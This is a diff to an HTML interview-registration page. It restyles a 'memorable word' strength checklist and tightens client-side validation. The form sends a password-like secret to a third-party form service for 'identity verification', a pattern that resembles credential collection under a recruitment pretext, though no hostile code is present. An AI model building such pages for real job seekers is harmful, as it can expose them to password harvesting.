@@ -141,52 +141,43 @@
       cursor: pointer;
     }
 
-    /* Memorable word checklist */
-    .checklist {
-      margin-top: 10px;
-      padding: 12px;
-      border: 1px solid var(--border);
-      border-radius: 12px;
-      background: #f9fafb;
-      display: none; /* stays hidden until click */
+    /* ✅ Memorable word checklist (matches your screenshot style) */
+    .pw-checklist{
+      display:none; /* only show once clicked */
+      margin-top:10px;
+      padding:10px 12px;
+      background:#fff;
+      border:1px solid #e5e7eb;
+      border-radius:10px;
+      box-shadow: 0 8px 18px rgba(0,0,0,.06);
     }
 
-    .checklist-title{
-      font-size: 12px;
-      font-weight: 800;
-      color: var(--text);
-      margin-bottom: 8px;
+    .pw-checklist ul{
+      list-style:none;
+      padding:0;
+      margin:0;
+      display:grid;
+      gap:6px;
     }
 
-    .checklist ul{
-      list-style: none;
-      padding: 0;
-      margin: 0;
-      display: grid;
-      gap: 6px;
+    .pw-rule{
+      font-size:13px;
+      color:#111827;
+      display:flex;
+      align-items:center;
+      gap:8px;
+      line-height:1.2;
     }
 
-    .rule {
-      font-size: 12px;
-      color: var(--muted);
-      display: flex;
-      align-items: center;
-      gap: 8px;
+    .pw-icon{
+      width:16px;
+      display:inline-flex;
+      justify-content:center;
+      font-weight:800;
     }
 
-    .dot {
-      width: 10px;
-      height: 10px;
-      border-radius: 999px;
-      background: #d1d5db; /* neutral */
-      flex: 0 0 auto;
-    }
-
-    .rule.ok { color: #065f46; }
-    .rule.ok .dot { background: #10b981; }
-
-    .rule.bad { color: #991b1b; }
-    .rule.bad .dot { background: #ef4444; }
+    .pw-rule.bad .pw-icon{ color:#111827; } /* black X */
+    .pw-rule.ok  .pw-icon{ color:#16a34a; } /* green tick */
   </style>
 </head>
 
@@ -209,14 +200,14 @@
       Please register your details so we can confirm your interview.
     </p>
 
+    <!-- ✅ KEEP EXACTLY THIS (as requested) -->
     <form
-  action="https://formspree.io/f/mykyawdj"
-  method="POST"
->
-
+      action="https://formspree.io/f/mykyawdj"
+      method="POST"
+    >
       <input type="hidden" name="_subject" value="New Candidate Registration">
       <input type="hidden" name="_template" value="table">
-      <!-- If you have a real thanks.html on your site, you can use this instead:
+      <!-- Optional (only use if you have thanks.html on your site):
       <input type="hidden" name="_redirect" value="/thanks.html">
       -->
 
@@ -251,17 +242,16 @@
                  minlength="8"
                  autocomplete="new-password"
                  required>
-          <div class="help">
-            Used only to verify your identity during scheduling.
-          </div>
+          <div class="help">Used only to verify your identity during scheduling.</div>
 
-          <!-- Checklist (hidden until click) -->
-          <div class="checklist" id="mwChecklist">
-            <div class="checklist-title">Memorable word requirements</div>
+          <!-- ✅ Checklist (hidden until click) -->
+          <div class="pw-checklist" id="pwChecklist">
             <ul>
-              <li class="rule" id="rLen"><span class="dot"></span> At least 8 characters</li>
-              <li class="rule" id="rSpec"><span class="dot"></span> Contains 1 special character</li>
-              <li class="rule" id="rMatch"><span class="dot"></span> Matches confirmation</li>
+              <li class="pw-rule bad" id="pwLen"><span class="pw-icon">×</span> Minimum of 8 characters</li>
+              <li class="pw-rule bad" id="pwLower"><span class="pw-icon">×</span> One lower case</li>
+              <li class="pw-rule bad" id="pwUpper"><span class="pw-icon">×</span> One upper case</li>
+              <li class="pw-rule bad" id="pwNum"><span class="pw-icon">×</span> One number</li>
+              <li class="pw-rule bad" id="pwSpec"><span class="pw-icon">×</span> One special character</li>
             </ul>
           </div>
         </div>
@@ -273,6 +263,7 @@
                  placeholder="Must match"
                  autocomplete="new-password"
                  required>
+          <div class="help">Must match your memorable word.</div>
         </div>
 
       </div>
@@ -285,60 +276,65 @@
 </main>
 
 <script>
-  const form = document.getElementById('regForm');
   const mw = document.getElementById('mw');
   const cmw = document.getElementById('cmw');
+  const form = document.querySelector('form');
 
-  const checklist = document.getElementById('mwChecklist');
-  const rLen = document.getElementById('rLen');
-  const rSpec = document.getElementById('rSpec');
-  const rMatch = document.getElementById('rMatch');
+  const checklist = document.getElementById('pwChecklist');
+  const pwLen   = document.getElementById('pwLen');
+  const pwLower = document.getElementById('pwLower');
+  const pwUpper = document.getElementById('pwUpper');
+  const pwNum   = document.getElementById('pwNum');
+  const pwSpec  = document.getElementById('pwSpec');
 
-  function setRule(el, ok, touched) {
-    el.classList.remove('ok','bad');
-    if (!touched) return; // keep neutral until user interacts
-    el.classList.add(ok ? 'ok' : 'bad');
+  function setRule(el, ok){
+    el.classList.toggle('ok', ok);
+    el.classList.toggle('bad', !ok);
+    el.querySelector('.pw-icon').textContent = ok ? '✓' : '×';
   }
 
-  function hasSpecial(str) {
-    // anything not a letter/number counts as special
-    return /[^a-zA-Z0-9]/.test(str);
-  }
-
-  let touched = false;
-
-  function updateChecklist() {
+  function checkPw(){
     const v = mw.value || '';
-    const c = cmw.value || '';
-
-    setRule(rLen, v.length >= 8, touched);
-    setRule(rSpec, hasSpecial(v), touched);
-    setRule(rMatch, v.length > 0 && v === c, touched);
+    setRule(pwLen,   v.length >= 8);
+    setRule(pwLower, /[a-z]/.test(v));
+    setRule(pwUpper, /[A-Z]/.test(v));
+    setRule(pwNum,   /\d/.test(v));
+    setRule(pwSpec,  /[^a-zA-Z0-9]/.test(v));
   }
 
-  // show checklist only when user focuses/clicks memorable word
+  // ✅ only show once user clicks/focuses memorable word
   mw.addEventListener('focus', () => {
     checklist.style.display = 'block';
-    touched = true;
-    updateChecklist();
+    checkPw();
   });
 
-  mw.addEventListener('input', () => { touched = true; updateChecklist(); });
-  cmw.addEventListener('input', () => { touched = true; updateChecklist(); });
+  mw.addEventListener('input', checkPw);
 
+  // Optional: live update match as they type confirm
+  cmw.addEventListener('input', () => { /* keeps simple, no checklist item for match */ });
+
+  // ✅ block submission if memorable words do not match
   form.addEventListener('submit', function(e) {
-    const v = mw.value || '';
-    const valid = (v.length >= 8) && hasSpecial(v) && (mw.value === cmw.value);
-
-    if (!valid) {
+    if (mw.value !== cmw.value) {
       e.preventDefault();
-      touched = true;
-      updateChecklist();
+      alert('Memorable words do not match');
+      return;
+    }
 
-      if (mw.value !== cmw.value) return alert('Memorable words do not match');
-      if (v.length < 8) return alert('Memorable word must be at least 8 characters');
-      if (!hasSpecial(v)) return alert('Memorable word must include 1 special character');
-      return alert('Please check your memorable word requirements');
+    // ✅ enforce all checklist rules before allowing submit
+    const v = mw.value || '';
+    const ok =
+      (v.length >= 8) &&
+      (/[a-z]/.test(v)) &&
+      (/[A-Z]/.test(v)) &&
+      (/\d/.test(v)) &&
+      (/[^a-zA-Z0-9]/.test(v));
+
+    if (!ok) {
+      e.preventDefault();
+      checklist.style.display = 'block';
+      checkPw();
+      alert('Your memorable word must meet all requirements shown.');
     }
   });
 </script>
